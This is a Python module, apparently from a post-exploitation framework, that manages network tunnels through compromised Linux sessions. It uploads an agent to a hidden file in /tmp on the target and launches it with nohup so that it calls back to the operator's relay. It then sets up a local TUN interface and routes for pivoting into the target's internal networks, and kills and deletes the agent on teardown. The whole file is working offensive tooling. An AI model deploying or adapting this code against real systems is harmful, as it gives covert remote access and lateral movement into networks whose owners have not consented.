from __future__ import annotations

import asyncio
import getpass
import ipaddress
import os
import pathlib
import re
import secrets
import shlex
import subprocess
import threading
import time
from dataclasses import dataclass, field
from typing import Optional

from koi.modules.blueprint import KoiModule
from koi.session import SessionBusy
from koi.tunnel.agent_payload import build_agent_pyz
from koi.tunnel.engine.proxy import Proxy
from koi.utils.tcp import get_local_ip
from koi.utils.ui import (
    notify, password_prompt, print_report_box, ProgressBar,
    accent, bold, muted, plain, alert,
)

_NETMASK = 24
_MTU = 1500
_BASE_PORT = 11601
_MIN_PYTHON = (3, 13)
_JOIN_TIMEOUT = 5.0
_READY_DELAY = 0.4
_CALLBACK_WAIT = 15.0


class _Deployer(KoiModule):
    name = "tunnel"
    platform = "linux"

    def run(self) -> None:
        pass


def _fmt_uptime(seconds: float) -> str:
    s = int(seconds)
    h, s = divmod(s, 3600)
    m, s = divmod(s, 60)
    if h:
        return f"{h}h{m:02d}m"
    if m:
        return f"{m}m{s:02d}s"
    return f"{s}s"


@dataclass
class Tunnel:
    session_id: int
    index: int
    tun_name: str
    address: str
    port: int
    psk: str
    routes: list[str]
    callback_host: str
    state: str = "starting"
    error: Optional[str] = None
    started_at: float = field(default_factory=time.time)
    remote_path: Optional[str] = None
    deployed: bool = False
    proxy: Optional[object] = None
    thread: Optional[threading.Thread] = None
    loop: Optional[asyncio.AbstractEventLoop] = None
    task: Optional[object] = None


class TunnelManager:
    def __init__(self, listener):
        self._listener = listener
        self._tunnels: dict[int, Tunnel] = {}
        self._used: set[int] = set()
        self._lock = threading.Lock()

    def start(self, sess, routes: list[str], interactive: bool = True) -> None:
        sid = sess.id
        for cidr in routes:
            try:
                ipaddress.ip_network(cidr, strict=False)
            except ValueError:
                notify('error', f"Invalid CIDR {accent(cidr)} (expected e.g. {bold('10.0.0.0/24')}).")
                return

        with self._lock:
            existing = self._tunnels.get(sid)
            if existing and existing.state in ("starting", "up"):
                notify('error', f"Session {accent(f'#{sid}')} already has a tunnel ({existing.state}).")
                return
            collision = self._route_collision(routes, sid)
        if collision:
            cidr, other_sid, other_cidr = collision
            notify('error', f"Route {accent(cidr)} overlaps {accent(other_cidr)} "
                            f"already tunneled on session {accent(f'#{other_sid}')}.")
            return

        label = sess.tag or f"#{sid}"
        notify('status', muted(f"Bringing up tunnel for session {accent(label)} …"))

        if sess.os_type != "linux":
            notify('error', f"Tunnels support linux targets only (session is {sess.os_type or 'unknown'}).")
            return

        deployer = _Deployer(sess)
        exe = self._detect_python(deployer)
        if exe is None:
            notify('error', f"Session {accent(label)} has no Python {_MIN_PYTHON[0]}.{_MIN_PYTHON[1]}+ "
                            f"(required for TLS-PSK); cannot deploy the agent.")
            return

        with self._lock:
            index = self._alloc_index()
            tun = Tunnel(
                session_id=sid, index=index, tun_name=f"tunel{index}",
                address=f"240.0.{index}.1", port=_BASE_PORT + index,
                psk=secrets.token_urlsafe(24), routes=list(routes),
                callback_host=self._session_ip(sess),
            )
            self._tunnels[sid] = tun

        password = None
        if os.geteuid() != 0:
            if interactive:
                notify('status', muted(f"Creating TUN {bold(tun.tun_name)} requires root."))
                password = password_prompt("sudo password:")
                if not password:
                    notify('warning', "Cancelled, no tunnel started.")
                    self._discard(sid)
                    return
            else:
                notify('status', muted("Root needed: relying on cached sudo credentials."))

        if not self._provision_interface(tun, password):
            self._discard(sid)
            return

        notify('status', muted(f"Starting relay on {bold(f'0.0.0.0:{tun.port}')} {muted('(TLS-PSK)')} …"))
        self._spawn_proxy(tun)
        time.sleep(_READY_DELAY)
        if tun.state == "error":
            notify('error', f"Tunnel failed to start: {tun.error}")
            self._teardown_device(tun, password=password)
            self._discard(sid)
            return

        if not self._deploy_agent(tun, sess, deployer, exe):
            self._teardown_device(tun, password=password)
            self._discard(sid)
            return

        tun.state = "up"
        notify('success', f"Tunnel {bold(tun.tun_name)} up on session {accent(label)}, agent connected.")
        for cidr in tun.routes:
            notify('status', muted(f"  route {bold(cidr)} → {tun.tun_name}"))
        if not tun.routes:
            notify('status', muted(f"  no route yet: {bold(f'tunnel stop {sid}')} then start with a CIDR"))

    def describe(self, sid: int) -> Optional[dict]:
        tun = self._tunnels.get(sid)
        if tun is None:
            return None
        channel = getattr(tun.proxy, "channel", None) if tun.proxy else None
        return {
            "session": tun.session_id,
            "state": tun.state,
            "interface": tun.tun_name,
            "address": f"{tun.address}/{_NETMASK}",
            "callback": f"{tun.callback_host}:{tun.port}",
            "routes": list(tun.routes),
            "agent_connected": channel is not None,
            "rx_packets": getattr(channel, "rx_packets", 0) if channel else 0,
            "tx_packets": getattr(channel, "tx_packets", 0) if channel else 0,
            "uptime": _fmt_uptime(time.time() - tun.started_at),
            "error": tun.error,
        }

    def snapshot(self) -> list:
        with self._lock:
            sids = sorted(self._tunnels)
        return [d for d in (self.describe(sid) for sid in sids) if d is not None]

    def status(self, sess) -> None:
        d = self.describe(sess.id)
        if d is None:
            notify('info', f"No tunnel on session {accent(f'#{sess.id}')}.")
            return
        state_fn = {"up": plain, "error": alert, "stopping": muted, "down": muted}.get(d["state"], muted)
        data = {
            "Session": accent(f"#{sess.id}") + (muted(f" ({sess.tag})") if sess.tag else ""),
            "State": state_fn(d["state"]),
            "Interface": d["interface"],
            "Address": d["address"],
            "Callback": d["callback"],
            "Routes": ", ".join(d["routes"]) if d["routes"] else muted("none"),
            "Agent": plain("connected") if d["agent_connected"] else muted("waiting"),
            "Packets": muted(f"rx {d['rx_packets']} / tx {d['tx_packets']}"),
            "Uptime": d["uptime"],
        }
        if d["error"]:
            data["Error"] = alert(d["error"])
        print_report_box(f"tunnel {d['interface']}", data)

    def stop(self, sid: int, quiet: bool = False, interactive: bool = True) -> bool:
        with self._lock:
            tun = self._tunnels.get(sid)
        if tun is None:
            if not quiet:
                notify('warning', f"No tunnel on session {accent(f'#{sid}')}.")
            return False

        tun.state = "stopping"
        if not quiet:
            notify('status', muted(f"Stopping tunnel {bold(tun.tun_name)} …"))

        self._kill_agent(tun)

        if tun.loop is not None and tun.task is not None:
            try:
                tun.loop.call_soon_threadsafe(tun.task.cancel)
            except RuntimeError:
                pass
        if tun.thread is not None:
            tun.thread.join(timeout=_JOIN_TIMEOUT)

        self._teardown_device(tun, quiet=quiet, interactive=interactive and not quiet)
        tun.state = "down"
        self._discard(sid)
        if not quiet:
            notify('success', f"Tunnel on session {accent(f'#{sid}')} stopped.")
        return True

    def shutdown_all(self) -> None:
        for sid in list(self._tunnels.keys()):
            self.stop(sid, quiet=True)

    def _detect_python(self, deployer: _Deployer) -> Optional[str]:
        for exe in ("python3", "python"):
            out = deployer._try_exec(f"{exe} --version 2>&1")
            m = re.search(r"Python (\d+)\.(\d+)", out)
            if m and (int(m.group(1)), int(m.group(2))) >= _MIN_PYTHON:
                return exe
        return None

    def _deploy_agent(self, tun: Tunnel, sess, deployer: _Deployer, exe: str) -> bool:
        try:
            pyz = build_agent_pyz()
            data = pathlib.Path(pyz).read_bytes()
        except Exception as exc:
            notify('error', f"Could not build the agent payload: {exc}")
            return False

        tun.remote_path = f"/tmp/.koi-tun-{tun.index}-{secrets.token_hex(4)}.pyz"
        notify('status', muted(f"Uploading agent ({len(data)} bytes) to {bold(tun.remote_path)} …"))
        bar = ProgressBar(len(data), prefix=muted("agent"))
        try:
            ok = deployer._upload_bytes(data, tun.remote_path, on_progress=bar.update)
            bar.done()
        except SessionBusy:
            notify('error', "Session is busy (in use); background it and retry.")
            return False
        except Exception as exc:
            notify('error', f"Upload failed: {exc}")
            return False
        if not ok:
            notify('error', "Upload did not verify on the target.")
            return False

        launch = (
            f"TUNEL_PSK={shlex.quote(tun.psk)} nohup {exe} {shlex.quote(tun.remote_path)} "
            f"{shlex.quote(tun.callback_host)} --port {tun.port} "
            f">/tmp/.koi-tun-{tun.index}.log 2>&1 &"
        )
        notify('status', muted(f"Launching agent → dials back to {bold(f'{tun.callback_host}:{tun.port}')} …"))
        try:
            deployer.exec(launch)
        except Exception as exc:
            notify('error', f"Could not launch the agent: {exc}")
            return False
        tun.deployed = True

        notify('status', muted("Waiting for the agent to call back …"))
        deadline = time.time() + _CALLBACK_WAIT
        while time.time() < deadline:
            if getattr(tun.proxy, "channel", None) is not None:
                return True
            time.sleep(0.5)

        notify('error', f"Agent never called back after {int(_CALLBACK_WAIT)}s "
                        f"(egress to :{tun.port} filtered, or the agent failed to start).")
        notify('status', muted(f"  check on target: {bold(f'cat /tmp/.koi-tun-{tun.index}.log')}"))
        return False

    def _kill_agent(self, tun: Tunnel) -> None:
        if not tun.deployed or not tun.remote_path:
            return
        sess = self._listener._sessions.get(tun.session_id)
        if sess is None or not sess.alive:
            return
        base = os.path.basename(tun.remote_path)
        try:
            _Deployer(sess).exec(
                f"pkill -f {shlex.quote(base)}; rm -f {shlex.quote(tun.remote_path)}",
                timeout=5,
            )
        except Exception:
            pass

    def _provision_interface(self, tun: Tunnel, password: Optional[str]) -> bool:
        user = getpass.getuser()
        steps = [
            (["ip", "tuntap", "add", "dev", tun.tun_name, "mode", "tun", "user", user],
             f"create {bold(tun.tun_name)} (owner {user})"),
            (["ip", "addr", "add", f"{tun.address}/{_NETMASK}", "dev", tun.tun_name],
             f"address {bold(f'{tun.address}/{_NETMASK}')}"),
            (["ip", "link", "set", "dev", tun.tun_name, "mtu", str(_MTU)], f"mtu {_MTU}"),
            (["ip", "link", "set", "dev", tun.tun_name, "up"], "link up"),
        ]
        steps += [
            (["ip", "route", "add", cidr, "dev", tun.tun_name], f"route {bold(cidr)}")
            for cidr in tun.routes
        ]
        for args, desc in steps:
            notify('status', muted(f"  {desc} …"))
            proc = self._run_priv(args, password=password)
            if proc.returncode != 0:
                err = (proc.stderr or proc.stdout or "").strip().splitlines()
                msg = err[-1] if err else "unknown error"
                if "File exists" in msg:
                    continue
                notify('error', f"  {desc} failed: {msg}")
                self._teardown_device(tun, password=password)
                return False
        return True

    def _spawn_proxy(self, tun: Tunnel) -> None:
        tun.proxy = Proxy(
            psk=tun.psk, tun_name=tun.tun_name, address=tun.address,
            netmask=_NETMASK, routes=[], host="0.0.0.0", port=tun.port,
            mtu=_MTU, configure=False,
        )
        tun.thread = threading.Thread(
            target=self._thread_main, args=(tun,), daemon=True, name=f"tunnel-{tun.session_id}",
        )
        tun.thread.start()

    def _thread_main(self, tun: Tunnel) -> None:
        loop = asyncio.new_event_loop()
        tun.loop = loop
        asyncio.set_event_loop(loop)
        try:
            tun.task = loop.create_task(tun.proxy.run())
            loop.run_until_complete(tun.task)
        except asyncio.CancelledError:
            pass
        except Exception as exc:
            tun.state = "error"
            tun.error = str(exc)
            self._listener._announce(
                'error', f"Tunnel {bold(tun.tun_name)} (session {accent(f'#{tun.session_id}')}) stopped: {exc}")
        finally:
            try:
                loop.run_until_complete(loop.shutdown_asyncgens())
            except Exception:
                pass
            loop.close()

    def _teardown_device(self, tun: Tunnel, password: Optional[str] = None,
                         quiet: bool = False, interactive: bool = False) -> None:
        args = ["ip", "tuntap", "del", "dev", tun.tun_name, "mode", "tun"]
        proc = self._run_priv(args, password=password)
        if proc.returncode != 0 and os.geteuid() != 0 and interactive:
            pw = password_prompt("sudo password:")
            if pw:
                proc = self._run_priv(args, password=pw)
        if proc.returncode != 0 and os.geteuid() != 0:
            self._say(quiet, 'warning',
                      f"Could not remove {bold(tun.tun_name)}; clean up: "
                      f"{muted(f'sudo ip tuntap del dev {tun.tun_name} mode tun')}")

    def _run_priv(self, args: list[str], password: Optional[str] = None):
        if os.geteuid() == 0:
            cmd, stdin = list(args), None
        elif password is not None:
            cmd, stdin = ["sudo", "-S", "-p", "", *args], password + "\n"
        else:
            cmd, stdin = ["sudo", "-n", *args], None
        return subprocess.run(cmd, input=stdin, text=True, capture_output=True)

    def _route_collision(self, routes: list[str], sid: int):
        for other_sid, tun in self._tunnels.items():
            if other_sid == sid or tun.state not in ("starting", "up"):
                continue
            others = [ipaddress.ip_network(o, strict=False) for o in tun.routes]
            for r in routes:
                rnet = ipaddress.ip_network(r, strict=False)
                match = next((o for o in others if rnet.overlaps(o)), None)
                if match is not None:
                    return (r, other_sid, str(match))
        return None

    def _alloc_index(self) -> int:
        i = 0
        while i in self._used:
            i += 1
        self._used.add(i)
        return i

    def _discard(self, sid: int) -> None:
        with self._lock:
            tun = self._tunnels.pop(sid, None)
            if tun is not None:
                self._used.discard(tun.index)

    def _session_ip(self, sess) -> str:
        try:
            return get_local_ip(sess.addr[0])
        except OSError:
            return "0.0.0.0"

    def _say(self, quiet: bool, msg_type: str, text: str) -> None:
        if quiet:
            self._listener._announce(msg_type, text)
        else:
            notify(msg_type, text)
